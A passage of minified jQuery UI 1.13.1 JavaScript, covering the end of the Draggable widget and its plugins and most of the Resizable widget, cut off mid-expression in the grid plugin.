e,a,c,b=this.options,d=this.document[0];if(this.relativeContainer=null,!b.containment){this.containment=null;return}if("window"===b.containment){this.containment=[$(window).scrollLeft()-this.offset.relative.left-this.offset.parent.left,$(window).scrollTop()-this.offset.relative.top-this.offset.parent.top,$(window).scrollLeft()+$(window).width()-this.helperProportions.width-this.margins.left,$(window).scrollTop()+($(window).height()||d.body.parentNode.scrollHeight)-this.helperProportions.height-this.margins.top];return}if("document"===b.containment){this.containment=[0,0,$(d).width()-this.helperProportions.width-this.margins.left,($(d).height()||d.body.parentNode.scrollHeight)-this.helperProportions.height-this.margins.top];return}if(b.containment.constructor===Array){this.containment=b.containment;return}"parent"===b.containment&&(b.containment=this.helper[0].parentNode),(c=(a=$(b.containment))[0])&&(e=/(scroll|auto)/.test(a.css("overflow")),this.containment=[(parseInt(a.css("borderLeftWidth"),10)||0)+(parseInt(a.css("paddingLeft"),10)||0),(parseInt(a.css("borderTopWidth"),10)||0)+(parseInt(a.css("paddingTop"),10)||0),(e?Math.max(c.scrollWidth,c.offsetWidth):c.offsetWidth)-(parseInt(a.css("borderRightWidth"),10)||0)-(parseInt(a.css("paddingRight"),10)||0)-this.helperProportions.width-this.margins.left-this.margins.right,(e?Math.max(c.scrollHeight,c.offsetHeight):c.offsetHeight)-(parseInt(a.css("borderBottomWidth"),10)||0)-(parseInt(a.css("paddingBottom"),10)||0)-this.helperProportions.height-this.margins.top-this.margins.bottom],this.relativeContainer=a)},_convertPositionTo:function(d,b){b||(b=this.position);var a="absolute"===d?1:-1,c=this._isRootNode(this.scrollParent[0]);return{top:b.top+this.offset.relative.top*a+this.offset.parent.top*a-("fixed"===this.cssPosition?-this.offset.scroll.top:c?0:this.offset.scroll.top)*a,left:b.left+this.offset.relative.left*a+this.offset.parent.left*a-("fixed"===this.cssPosition?-this.offset.scroll.left:c?0:this.offset.scroll.left)*a}},_generatePosition:function(e,j){var a,h,c,d,b=this.options,i=this._isRootNode(this.scrollParent[0]),f=e.pageX,g=e.pageY;return i&&this.offset.scroll||(this.offset.scroll={top:this.scrollParent.scrollTop(),left:this.scrollParent.scrollLeft()}),j&&(this.containment&&(this.relativeContainer?(h=this.relativeContainer.offset(),a=[this.containment[0]+h.left,this.containment[1]+h.top,this.containment[2]+h.left,this.containment[3]+h.top]):a=this.containment,e.pageX-this.offset.click.left<a[0]&&(f=a[0]+this.offset.click.left),e.pageY-this.offset.click.top<a[1]&&(g=a[1]+this.offset.click.top),e.pageX-this.offset.click.left>a[2]&&(f=a[2]+this.offset.click.left),e.pageY-this.offset.click.top>a[3]&&(g=a[3]+this.offset.click.top)),b.grid&&(c=b.grid[1]?this.originalPageY+Math.round((g-this.originalPageY)/b.grid[1])*b.grid[1]:this.originalPageY,g=a?c-this.offset.click.top>=a[1]||c-this.offset.click.top>a[3]?c:c-this.offset.click.top>=a[1]?c-b.grid[1]:c+b.grid[1]:c,d=b.grid[0]?this.originalPageX+Math.round((f-this.originalPageX)/b.grid[0])*b.grid[0]:this.originalPageX,f=a?d-this.offset.click.left>=a[0]||d-this.offset.click.left>a[2]?d:d-this.offset.click.left>=a[0]?d-b.grid[0]:d+b.grid[0]:d),"y"===b.axis&&(f=this.originalPageX),"x"===b.axis&&(g=this.originalPageY)),{top:g-this.offset.click.top-this.offset.relative.top-this.offset.parent.top+("fixed"===this.cssPosition?-this.offset.scroll.top:i?0:this.offset.scroll.top),left:f-this.offset.click.left-this.offset.relative.left-this.offset.parent.left+("fixed"===this.cssPosition?-this.offset.scroll.left:i?0:this.offset.scroll.left)}},_clear:function(){this._removeClass(this.helper,"ui-draggable-dragging"),this.helper[0]===this.element[0]||this.cancelHelperRemoval||this.helper.remove(),this.helper=null,this.cancelHelperRemoval=!1,this.destroyOnClear&&this.destroy()},_trigger:function(b,c,a){return a=a||this._uiHash(),$.ui.plugin.call(this,b,[c,a,this],!0),/^(drag|start|stop)/.test(b)&&(this.positionAbs=this._convertPositionTo("absolute"),a.offset=this.positionAbs),$.Widget.prototype._trigger.call(this,b,c,a)},plugins:{},_uiHash:function(){return{helper:this.helper,position:this.position,originalPosition:this.originalPosition,offset:this.positionAbs}}}),$.ui.plugin.add("draggable","connectToSortable",{start:function(c,b,a){var d=$.extend({},b,{item:a.element});a.sortables=[],$(a.options.connectToSortable).each(function(){var b=$(this).sortable("instance");b&&!b.options.disabled&&(a.sortables.push(b),b.refreshPositions(),b._trigger("activate",c,d))})},stop:function(c,b,a){var d=$.extend({},b,{item:a.element});a.cancelHelperRemoval=!1,$.each(a.sortables,function(){var b=this;b.isOver?(b.isOver=0,a.cancelHelperRemoval=!0,b.cancelHelperRemoval=!1,b._storedCSS={position:b.placeholder.css("position"),top:b.placeholder.css("top"),left:b.placeholder.css("left")},b._mouseStop(c),b.options.helper=b.options._helper):(b.cancelHelperRemoval=!0,b._trigger("deactivate",c,d))})},drag:function(b,c,a){$.each(a.sortables,function(){var e=!1,d=this;d.positionAbs=a.positionAbs,d.helperProportions=a.helperProportions,d.offset.click=a.offset.click,d._intersectsWith(d.containerCache)&&(e=!0,$.each(a.sortables,function(){return this.positionAbs=a.positionAbs,this.helperProportions=a.helperProportions,this.offset.click=a.offset.click,this!==d&&this._intersectsWith(this.containerCache)&&$.contains(d.element[0],this.element[0])&&(e=!1),e})),e?(d.isOver||(d.isOver=1,a._parent=c.helper.parent(),d.currentItem=c.helper.appendTo(d.element).data("ui-sortable-item",!0),d.options._helper=d.options.helper,d.options.helper=function(){return c.helper[0]},b.target=d.currentItem[0],d._mouseCapture(b,!0),d._mouseStart(b,!0,!0),d.offset.click.top=a.offset.click.top,d.offset.click.left=a.offset.click.left,d.offset.parent.left-=a.offset.parent.left-d.offset.parent.left,d.offset.parent.top-=a.offset.parent.top-d.offset.parent.top,a._trigger("toSortable",b),a.dropped=d.element,$.each(a.sortables,function(){this.refreshPositions()}),a.currentItem=a.element,d.fromOutside=a),d.currentItem&&(d._mouseDrag(b),c.position=d.position)):d.isOver&&(d.isOver=0,d.cancelHelperRemoval=!0,d.options._revert=d.options.revert,d.options.revert=!1,d._trigger("out",b,d._uiHash(d)),d._mouseStop(b,!0),d.options.revert=d.options._revert,d.options.helper=d.options._helper,d.placeholder&&d.placeholder.remove(),c.helper.appendTo(a._parent),a._refreshOffsets(b),c.position=a._generatePosition(b,!0),a._trigger("fromSortable",b),a.dropped=!1,$.each(a.sortables,function(){this.refreshPositions()}))})}}),$.ui.plugin.add("draggable","cursor",{start:function(d,e,c){var a=$("body"),b=c.options;a.css("cursor")&&(b._cursor=a.css("cursor")),a.css("cursor",b.cursor)},stop:function(c,d,b){var a=b.options;a._cursor&&$("body").css("cursor",a._cursor)}}),$.ui.plugin.add("draggable","opacity",{start:function(e,c,d){var a=$(c.helper),b=d.options;a.css("opacity")&&(b._opacity=a.css("opacity")),a.css("opacity",b.opacity)},stop:function(d,b,c){var a=c.options;a._opacity&&$(b.helper).css("opacity",a._opacity)}}),$.ui.plugin.add("draggable","scroll",{start:function(b,c,a){a.scrollParentNotHidden||(a.scrollParentNotHidden=a.helper.scrollParent(!1)),a.scrollParentNotHidden[0]!==a.document[0]&&"HTML"!==a.scrollParentNotHidden[0].tagName&&(a.overflowOffset=a.scrollParentNotHidden.offset())},drag:function(d,g,f){var a=f.options,e=!1,c=f.scrollParentNotHidden[0],b=f.document[0];c!==b&&"HTML"!==c.tagName?((!a.axis||"x"!==a.axis)&&(f.overflowOffset.top+c.offsetHeight-d.pageY<a.scrollSensitivity?c.scrollTop=e=c.scrollTop+a.scrollSpeed:d.pageY-f.overflowOffset.top<a.scrollSensitivity&&(c.scrollTop=e=c.scrollTop-a.scrollSpeed)),(!a.axis||"y"!==a.axis)&&(f.overflowOffset.left+c.offsetWidth-d.pageX<a.scrollSensitivity?c.scrollLeft=e=c.scrollLeft+a.scrollSpeed:d.pageX-f.overflowOffset.left<a.scrollSensitivity&&(c.scrollLeft=e=c.scrollLeft-a.scrollSpeed))):((!a.axis||"x"!==a.axis)&&(d.pageY-$(b).scrollTop()<a.scrollSensitivity?e=$(b).scrollTop($(b).scrollTop()-a.scrollSpeed):$(window).height()-(d.pageY-$(b).scrollTop())<a.scrollSensitivity&&(e=$(b).scrollTop($(b).scrollTop()+a.scrollSpeed))),(!a.axis||"y"!==a.axis)&&(d.pageX-$(b).scrollLeft()<a.scrollSensitivity?e=$(b).scrollLeft($(b).scrollLeft()-a.scrollSpeed):$(window).width()-(d.pageX-$(b).scrollLeft())<a.scrollSensitivity&&(e=$(b).scrollLeft($(b).scrollLeft()+a.scrollSpeed)))),!1!==e&&$.ui.ddmanager&&!a.dropBehaviour&&$.ui.ddmanager.prepareOffsets(f,d)}}),$.ui.plugin.add("draggable","snap",{start:function(c,d,b){var a=b.options;b.snapElements=[],$(a.snap.constructor!==String?a.snap.items||":data(ui-draggable)":a.snap).each(function(){var a=$(this),c=a.offset();this!==b.element[0]&&b.snapElements.push({item:this,width:a.outerWidth(),height:a.outerHeight(),top:c.top,left:c.left})})},drag:function(s,d,a){var e,f,g,h,j,k,i,l,b,o,p=a.options,c=p.snapTolerance,m=d.offset.left,q=m+a.helperProportions.width,n=d.offset.top,r=n+a.helperProportions.height;for(b=a.snapElements.length-1;b>=0;b--){if(k=(j=a.snapElements[b].left-a.margins.left)+a.snapElements[b].width,i=a.snapElements[b].top-a.margins.top,l=i+a.snapElements[b].height,q<j-c||m>k+c||r<i-c||n>l+c||!$.contains(a.snapElements[b].item.ownerDocument,a.snapElements[b].item)){a.snapElements[b].snapping&&a.options.snap.release&&a.options.snap.release.call(a.element,s,$.extend(a._uiHash(),{snapItem:a.snapElements[b].item})),a.snapElements[b].snapping=!1;continue}"inner"!==p.snapMode&&(e=Math.abs(i-r)<=c,f=Math.abs(l-n)<=c,g=Math.abs(j-q)<=c,h=Math.abs(k-m)<=c,e&&(d.position.top=a._convertPositionTo("relative",{top:i-a.helperProportions.height,left:0}).top),f&&(d.position.top=a._convertPositionTo("relative",{top:l,left:0}).top),g&&(d.position.left=a._convertPositionTo("relative",{top:0,left:j-a.helperProportions.width}).left),h&&(d.position.left=a._convertPositionTo("relative",{top:0,left:k}).left)),o=e||f||g||h,"outer"!==p.snapMode&&(e=Math.abs(i-n)<=c,f=Math.abs(l-r)<=c,g=Math.abs(j-m)<=c,h=Math.abs(k-q)<=c,e&&(d.position.top=a._convertPositionTo("relative",{top:i,left:0}).top),f&&(d.position.top=a._convertPositionTo("relative",{top:l-a.helperProportions.height,left:0}).top),g&&(d.position.left=a._convertPositionTo("relative",{top:0,left:j}).left),h&&(d.position.left=a._convertPositionTo("relative",{top:0,left:k-a.helperProportions.width}).left)),!a.snapElements[b].snapping&&(e||f||g||h||o)&&a.options.snap.snap&&a.options.snap.snap.call(a.element,s,$.extend(a._uiHash(),{snapItem:a.snapElements[b].item})),a.snapElements[b].snapping=e||f||g||h||o}}}),$.ui.plugin.add("draggable","stack",{start:function(e,f,c){var b,d=c.options,a=$.makeArray($(d.stack)).sort(function(a,b){return(parseInt($(a).css("zIndex"),10)||0)-(parseInt($(b).css("zIndex"),10)||0)});a.length&&(b=parseInt($(a[0]).css("zIndex"),10)||0,$(a).each(function(a){$(this).css("zIndex",b+a)}),this.css("zIndex",b+a.length))}}),$.ui.plugin.add("draggable","zIndex",{start:function(e,c,d){var a=$(c.helper),b=d.options;a.css("zIndex")&&(b._zIndex=a.css("zIndex")),a.css("zIndex",b.zIndex)},stop:function(d,b,c){var a=c.options;a._zIndex&&$(b.helper).css("zIndex",a._zIndex)}}),$.ui.draggable,/*!
 * jQuery UI Resizable 1.13.1
 * http://jqueryui.com
 *
 * Copyright jQuery Foundation and other contributors
 * Released under the MIT license.
 * http://jquery.org/license
 */ $.widget("ui.resizable",$.ui.mouse,{version:"1.13.1",widgetEventPrefix:"resize",options:{alsoResize:!1,animate:!1,animateDuration:"slow",animateEasing:"swing",aspectRatio:!1,autoHide:!1,classes:{"ui-resizable-se":"ui-icon ui-icon-gripsmall-diagonal-se"},containment:!1,ghost:!1,grid:!1,handles:"e,s,se",helper:!1,maxHeight:null,maxWidth:null,minHeight:10,minWidth:10,zIndex:90,resize:null,start:null,stop:null},_num:function(a){return parseFloat(a)||0},_isNumber:function(a){return!isNaN(parseFloat(a))},_hasScroll:function(a,c){if("hidden"===$(a).css("overflow"))return!1;var b=c&&"left"===c?"scrollLeft":"scrollTop",d=!1;if(a[b]>0)return!0;try{a[b]=1,d=a[b]>0,a[b]=0}catch(e){}return d},_create:function(){var b,a=this.options,c=this;this._addClass("ui-resizable"),$.extend(this,{_aspectRatio:!!a.aspectRatio,aspectRatio:a.aspectRatio,originalElement:this.element,_proportionallyResizeElements:[],_helper:a.helper||a.ghost||a.animate?a.helper||"ui-resizable-helper":null}),this.element[0].nodeName.match(/^(canvas|textarea|input|select|button|img)$/i)&&(this.element.wrap($("<div class='ui-wrapper'></div>").css({overflow:"hidden",position:this.element.css("position"),width:this.element.outerWidth(),height:this.element.outerHeight(),top:this.element.css("top"),left:this.element.css("left")})),this.element=this.element.parent().data("ui-resizable",this.element.resizable("instance")),this.elementIsWrapper=!0,b={marginTop:this.originalElement.css("marginTop"),marginRight:this.originalElement.css("marginRight"),marginBottom:this.originalElement.css("marginBottom"),marginLeft:this.originalElement.css("marginLeft")},this.element.css(b),this.originalElement.css("margin",0),this.originalResizeStyle=this.originalElement.css("resize"),this.originalElement.css("resize","none"),this._proportionallyResizeElements.push(this.originalElement.css({position:"static",zoom:1,display:"block"})),this.originalElement.css(b),this._proportionallyResize()),this._setupHandles(),a.autoHide&&$(this.element).on("mouseenter",function(){a.disabled||(c._removeClass("ui-resizable-autohide"),c._handles.show())}).on("mouseleave",function(){!a.disabled&&(c.resizing||(c._addClass("ui-resizable-autohide"),c._handles.hide()))}),this._mouseInit()},_destroy:function(){this._mouseDestroy(),this._addedHandles.remove();var a,b=function(a){$(a).removeData("resizable").removeData("ui-resizable").off(".resizable")};return this.elementIsWrapper&&(b(this.element),a=this.element,this.originalElement.css({position:a.css("position"),width:a.outerWidth(),height:a.outerHeight(),top:a.css("top"),left:a.css("left")}).insertAfter(a),a.remove()),this.originalElement.css("resize",this.originalResizeStyle),b(this.originalElement),this},_setOption:function(a,b){switch(this._super(a,b),a){case"handles":this._removeHandles(),this._setupHandles();break;case"aspectRatio":this._aspectRatio=!!b}},_setupHandles:function(){var b,c,d,f,a,e=this.options,g=this;if(this.handles=e.handles||($(".ui-resizable-handle",this.element).length?{n:".ui-resizable-n",e:".ui-resizable-e",s:".ui-resizable-s",w:".ui-resizable-w",se:".ui-resizable-se",sw:".ui-resizable-sw",ne:".ui-resizable-ne",nw:".ui-resizable-nw"}:"e,s,se"),this._handles=$(),this._addedHandles=$(),this.handles.constructor===String)for("all"===this.handles&&(this.handles="n,e,s,w,se,sw,ne,nw"),d=this.handles.split(","),this.handles={},c=0;c<d.length;c++)f="ui-resizable-"+(b=String.prototype.trim.call(d[c])),a=$("<div>"),this._addClass(a,"ui-resizable-handle "+f),a.css({zIndex:e.zIndex}),this.handles[b]=".ui-resizable-"+b,this.element.children(this.handles[b]).length||(this.element.append(a),this._addedHandles=this._addedHandles.add(a));this._renderAxis=function(b){var a,c,d,e;for(a in b=b||this.element,this.handles)this.handles[a].constructor===String?this.handles[a]=this.element.children(this.handles[a]).first().show():(this.handles[a].jquery||this.handles[a].nodeType)&&(this.handles[a]=$(this.handles[a]),this._on(this.handles[a],{mousedown:g._mouseDown})),this.elementIsWrapper&&this.originalElement[0].nodeName.match(/^(textarea|input|select|button)$/i)&&(c=$(this.handles[a],this.element),e=/sw|ne|nw|se|n|s/.test(a)?c.outerHeight():c.outerWidth(),d=["padding",/ne|nw|n/.test(a)?"Top":/se|sw|s/.test(a)?"Bottom":/^e$/.test(a)?"Right":"Left"].join(""),b.css(d,e),this._proportionallyResize()),this._handles=this._handles.add(this.handles[a])},this._renderAxis(this.element),this._handles=this._handles.add(this.element.find(".ui-resizable-handle")),this._handles.disableSelection(),this._handles.on("mouseover",function(){g.resizing||(this.className&&(a=this.className.match(/ui-resizable-(se|sw|ne|nw|n|e|s|w)/i)),g.axis=a&&a[1]?a[1]:"se")}),e.autoHide&&(this._handles.hide(),this._addClass("ui-resizable-autohide"))},_removeHandles:function(){this._addedHandles.remove()},_mouseCapture:function(a){var b,c,d=!1;for(b in this.handles)((c=$(this.handles[b])[0])===a.target||$.contains(c,a.target))&&(d=!0);return!this.options.disabled&&d},_mouseStart:function(e){var c,d,f,b=this.options,a=this.element;return this.resizing=!0,this._renderProxy(),c=this._num(this.helper.css("left")),d=this._num(this.helper.css("top")),b.containment&&(c+=$(b.containment).scrollLeft()||0,d+=$(b.containment).scrollTop()||0),this.offset=this.helper.offset(),this.position={left:c,top:d},this.size=this._helper?{width:this.helper.width(),height:this.helper.height()}:{width:a.width(),height:a.height()},this.originalSize=this._helper?{width:a.outerWidth(),height:a.outerHeight()}:{width:a.width(),height:a.height()},this.sizeDiff={width:a.outerWidth()-a.width(),height:a.outerHeight()-a.height()},this.originalPosition={left:c,top:d},this.originalMousePosition={left:e.pageX,top:e.pageY},this.aspectRatio="number"==typeof b.aspectRatio?b.aspectRatio:this.originalSize.width/this.originalSize.height||1,f=$(".ui-resizable-"+this.axis).css("cursor"),$("body").css("cursor","auto"===f?this.axis+"-resize":f),this._addClass("ui-resizable-resizing"),this._propagate("start",e),!0},_mouseDrag:function(a){var b,c,d=this.originalMousePosition,f=this.axis,g=a.pageX-d.left||0,h=a.pageY-d.top||0,e=this._change[f];return this._updatePrevProperties(),!!e&&(b=e.apply(this,[a,g,h]),this._updateVirtualBoundaries(a.shiftKey),(this._aspectRatio||a.shiftKey)&&(b=this._updateRatio(b,a)),b=this._respectSize(b,a),this._updateCache(b),this._propagate("resize",a),c=this._applyChanges(),!this._helper&&this._proportionallyResizeElements.length&&this._proportionallyResize(),$.isEmptyObject(c)||(this._updatePrevProperties(),this._trigger("resize",a,this.ui()),this._applyChanges()),!1)},_mouseStop:function(i){this.resizing=!1;var a,b,c,d,e,f,g,h=this.options;return this._helper&&(c=(b=(a=this._proportionallyResizeElements).length&&/textarea/i.test(a[0].nodeName))&&this._hasScroll(a[0],"left")?0:this.sizeDiff.height,d=b?0:this.sizeDiff.width,e={width:this.helper.width()-d,height:this.helper.height()-c},f=parseFloat(this.element.css("left"))+(this.position.left-this.originalPosition.left)||null,g=parseFloat(this.element.css("top"))+(this.position.top-this.originalPosition.top)||null,h.animate||this.element.css($.extend(e,{top:g,left:f})),this.helper.height(this.size.height),this.helper.width(this.size.width),this._helper&&!h.animate&&this._proportionallyResize()),$("body").css("cursor","auto"),this._removeClass("ui-resizable-resizing"),this._propagate("stop",i),this._helper&&this.helper.remove(),!1},_updatePrevProperties:function(){this.prevPosition={top:this.position.top,left:this.position.left},this.prevSize={width:this.size.width,height:this.size.height}},_applyChanges:function(){var a={};return this.position.top!==this.prevPosition.top&&(a.top=this.position.top+"px"),this.position.left!==this.prevPosition.left&&(a.left=this.position.left+"px"),this.size.width!==this.prevSize.width&&(a.width=this.size.width+"px"),this.size.height!==this.prevSize.height&&(a.height=this.size.height+"px"),this.helper.css(a),a},_updateVirtualBoundaries:function(g){var c,d,e,f,a,b=this.options;a={minWidth:this._isNumber(b.minWidth)?b.minWidth:0,maxWidth:this._isNumber(b.maxWidth)?b.maxWidth:1/0,minHeight:this._isNumber(b.minHeight)?b.minHeight:0,maxHeight:this._isNumber(b.maxHeight)?b.maxHeight:1/0},(this._aspectRatio||g)&&(c=a.minHeight*this.aspectRatio,e=a.minWidth/this.aspectRatio,d=a.maxHeight*this.aspectRatio,f=a.maxWidth/this.aspectRatio,c>a.minWidth&&(a.minWidth=c),e>a.minHeight&&(a.minHeight=e),d<a.maxWidth&&(a.maxWidth=d),f<a.maxHeight&&(a.maxHeight=f)),this._vBoundaries=a},_updateCache:function(a){this.offset=this.helper.offset(),this._isNumber(a.left)&&(this.position.left=a.left),this._isNumber(a.top)&&(this.position.top=a.top),this._isNumber(a.height)&&(this.size.height=a.height),this._isNumber(a.width)&&(this.size.width=a.width)},_updateRatio:function(a){var b=this.position,c=this.size,d=this.axis;return this._isNumber(a.height)?a.width=a.height*this.aspectRatio:this._isNumber(a.width)&&(a.height=a.width/this.aspectRatio),"sw"===d&&(a.left=b.left+(c.width-a.width),a.top=null),"nw"===d&&(a.top=b.top+(c.height-a.height),a.left=b.left+(c.width-a.width)),a},_respectSize:function(a){var b=this._vBoundaries,c=this.axis,d=this._isNumber(a.width)&&b.maxWidth&&b.maxWidth<a.width,e=this._isNumber(a.height)&&b.maxHeight&&b.maxHeight<a.height,f=this._isNumber(a.width)&&b.minWidth&&b.minWidth>a.width,g=this._isNumber(a.height)&&b.minHeight&&b.minHeight>a.height,h=this.originalPosition.left+this.originalSize.width,i=this.originalPosition.top+this.originalSize.height,j=/sw|nw|w/.test(c),k=/nw|ne|n/.test(c);return f&&(a.width=b.minWidth),g&&(a.height=b.minHeight),d&&(a.width=b.maxWidth),e&&(a.height=b.maxHeight),f&&j&&(a.left=h-b.minWidth),d&&j&&(a.left=h-b.maxWidth),g&&k&&(a.top=i-b.minHeight),e&&k&&(a.top=i-b.maxHeight),a.width||a.height||a.left||!a.top?a.width||a.height||a.top||!a.left||(a.left=null):a.top=null,a},_getPaddingPlusBorderDimensions:function(a){for(var b=0,c=[],d=[a.css("borderTopWidth"),a.css("borderRightWidth"),a.css("borderBottomWidth"),a.css("borderLeftWidth")],e=[a.css("paddingTop"),a.css("paddingRight"),a.css("paddingBottom"),a.css("paddingLeft")];b<4;b++)c[b]=parseFloat(d[b])||0,c[b]+=parseFloat(e[b])||0;return{height:c[0]+c[2],width:c[1]+c[3]}},_proportionallyResize:function(){if(this._proportionallyResizeElements.length)for(var a,b=0,c=this.helper||this.element;b<this._proportionallyResizeElements.length;b++)a=this._proportionallyResizeElements[b],this.outerDimensions||(this.outerDimensions=this._getPaddingPlusBorderDimensions(a)),a.css({height:c.height()-this.outerDimensions.height||0,width:c.width()-this.outerDimensions.width||0})},_renderProxy:function(){var a=this.element,b=this.options;this.elementOffset=a.offset(),this._helper?(this.helper=this.helper||$("<div></div>").css({overflow:"hidden"}),this._addClass(this.helper,this._helper),this.helper.css({width:this.element.outerWidth(),height:this.element.outerHeight(),position:"absolute",left:this.elementOffset.left+"px",top:this.elementOffset.top+"px",zIndex:++b.zIndex}),this.helper.appendTo("body").disableSelection()):this.helper=this.element},_change:{e:function(b,a){return{width:this.originalSize.width+a}},w:function(c,a){var b=this.originalSize;return{left:this.originalPosition.left+a,width:b.width-a}},n:function(c,d,a){var b=this.originalSize;return{top:this.originalPosition.top+a,height:b.height-a}},s:function(b,c,a){return{height:this.originalSize.height+a}},se:function(a,b,c){return $.extend(this._change.s.apply(this,arguments),this._change.e.apply(this,[a,b,c]))},sw:function(a,b,c){return $.extend(this._change.s.apply(this,arguments),this._change.w.apply(this,[a,b,c]))},ne:function(a,b,c){return $.extend(this._change.n.apply(this,arguments),this._change.e.apply(this,[a,b,c]))},nw:function(a,b,c){return $.extend(this._change.n.apply(this,arguments),this._change.w.apply(this,[a,b,c]))}},_propagate:function(a,b){$.ui.plugin.call(this,a,[b,this.ui()]),"resize"!==a&&this._trigger(a,b,this.ui())},plugins:{},ui:function(){return{originalElement:this.originalElement,element:this.element,helper:this.helper,position:this.position,size:this.size,originalSize:this.originalSize,originalPosition:this.originalPosition}}}),$.ui.plugin.add("resizable","animate",{stop:function(j){var a=$(this).resizable("instance"),c=a.options,b=a._proportionallyResizeElements,d=b.length&&/textarea/i.test(b[0].nodeName),g=d&&a._hasScroll(b[0],"left")?0:a.sizeDiff.height,h=d?0:a.sizeDiff.width,i={width:a.size.width-h,height:a.size.height-g},e=parseFloat(a.element.css("left"))+(a.position.left-a.originalPosition.left)||null,f=parseFloat(a.element.css("top"))+(a.position.top-a.originalPosition.top)||null;a.element.animate($.extend(i,f&&e?{top:f,left:e}:{}),{duration:c.animateDuration,easing:c.animateEasing,step:function(){var c={width:parseFloat(a.element.css("width")),height:parseFloat(a.element.css("height")),top:parseFloat(a.element.css("top")),left:parseFloat(a.element.css("left"))};b&&b.length&&$(b[0]).css({width:c.width,height:c.height}),a._updateCache(c),a._propagate("resize",j)}})}}),$.ui.plugin.add("resizable","containment",{start:function(){var d,e,f,g,h,i,j,a=$(this).resizable("instance"),k=a.options,l=a.element,c=k.containment,b=c instanceof $?c.get(0):/parent/.test(c)?l.parent().get(0):c;b&&(a.containerElement=$(b),/document/.test(c)||c===document?(a.containerOffset={left:0,top:0},a.containerPosition={left:0,top:0},a.parentData={element:$(document),left:0,top:0,width:$(document).width(),height:$(document).height()||document.body.parentNode.scrollHeight}):(d=$(b),e=[],$(["Top","Right","Left","Bottom"]).each(function(b,c){e[b]=a._num(d.css("padding"+c))}),a.containerOffset=d.offset(),a.containerPosition=d.position(),a.containerSize={height:d.innerHeight()-e[3],width:d.innerWidth()-e[1]},f=a.containerOffset,g=a.containerSize.height,h=a.containerSize.width,i=a._hasScroll(b,"left")?b.scrollWidth:h,j=a._hasScroll(b)?b.scrollHeight:g,a.parentData={element:b,left:f.left,top:f.top,width:i,height:j}))},resize:function(l){var f,g,h,i,a=$(this).resizable("instance"),m=a.options,b=a.containerOffset,j=a.position,d=a._aspectRatio||l.shiftKey,e={top:0,left:0},k=a.containerElement,c=!0;k[0]!==document&&/static/.test(k.css("position"))&&(e=b),j.left<(a._helper?b.left:0)&&(a.size.width=a.size.width+(a._helper?a.position.left-b.left:a.position.left-e.left),d&&(a.size.height=a.size.width/a.aspectRatio,c=!1),a.position.left=m.helper?b.left:0),j.top<(a._helper?b.top:0)&&(a.size.height=a.size.height+(a._helper?a.position.top-b.top:a.position.top),d&&(a.size.width=a.size.height*a.aspectRatio,c=!1),a.position.top=a._helper?b.top:0),h=a.containerElement.get(0)===a.element.parent().get(0),i=/relative|absolute/.test(a.containerElement.css("position")),h&&i?(a.offset.left=a.parentData.left+a.position.left,a.offset.top=a.parentData.top+a.position.top):(a.offset.left=a.element.offset().left,a.offset.top=a.element.offset().top),f=Math.abs(a.sizeDiff.width+(a._helper?a.offset.left-e.left:a.offset.left-b.left)),g=Math.abs(a.sizeDiff.height+(a._helper?a.offset.top-e.top:a.offset.top-b.top)),f+a.size.width>=a.parentData.width&&(a.size.width=a.parentData.width-f,d&&(a.size.height=a.size.width/a.aspectRatio,c=!1)),g+a.size.height>=a.parentData.height&&(a.size.height=a.parentData.height-g,d&&(a.size.width=a.size.height*a.aspectRatio,c=!1)),c||(a.position.left=a.prevPosition.left,a.position.top=a.prevPosition.top,a.size.width=a.prevSize.width,a.size.height=a.prevSize.height)},stop:function(){var a=$(this).resizable("instance"),c=a.options,d=a.containerOffset,e=a.containerPosition,f=a.containerElement,b=$(a.helper),g=b.offset(),h=b.outerWidth()-a.sizeDiff.width,i=b.outerHeight()-a.sizeDiff.height;a._helper&&!c.animate&&/relative/.test(f.css("position"))&&$(this).css({left:g.left-e.left-d.left,width:h,height:i}),a._helper&&!c.animate&&/static/.test(f.css("position"))&&$(this).css({left:g.left-e.left-d.left,width:h,height:i})}}),$.ui.plugin.add("resizable","alsoResize",{start:function(){var a=$(this).resizable("instance").options;$(a.alsoResize).each(function(){var a=$(this);a.data("ui-resizable-alsoresize",{width:parseFloat(a.width()),height:parseFloat(a.height()),left:parseFloat(a.css("left")),top:parseFloat(a.css("top"))})})},resize:function(e,f){var a=$(this).resizable("instance"),d=a.options,b=a.originalSize,c=a.originalPosition,g={height:a.size.height-b.height||0,width:a.size.width-b.width||0,top:a.position.top-c.top||0,left:a.position.left-c.left||0};$(d.alsoResize).each(function(){var a=$(this),d=$(this).data("ui-resizable-alsoresize"),b={},c=a.parents(f.originalElement[0]).length?["width","height"]:["width","height","top","left"];$.each(c,function(e,a){var c=(d[a]||0)+(g[a]||0);c&&c>=0&&(b[a]=c||null)}),a.css(b)})},stop:function(){$(this).removeData("ui-resizable-alsoresize")}}),$.ui.plugin.add("resizable","ghost",{start:function(){var a=$(this).resizable("instance"),b=a.size;a.ghost=a.originalElement.clone(),a.ghost.css({opacity:.25,display:"block",position:"relative",height:b.height,width:b.width,margin:0,left:0,top:0}),a._addClass(a.ghost,"ui-resizable-ghost"),!1!==$.uiBackCompat&&"string"==typeof a.options.ghost&&a.ghost.addClass(this.options.ghost),a.ghost.appendTo(a.helper)},resize:function(){var a=$(this).resizable("instance");a.ghost&&a.ghost.css({position:"relative",height:a.size.height,width:a.size.width})},stop:function(){var a=$(this).resizable("instance");a.ghost&&a.helper&&a.helper.get(0).removeChild(a.ghost.get(0))}}),$.ui.plugin.add("resizable","grid",{resize:function(){var i,a=$(this).resizable("instance"),b=a.options,n=a.size,g=a.originalSize,h=a.originalPosition,j=a.axis,k="number"==typeof 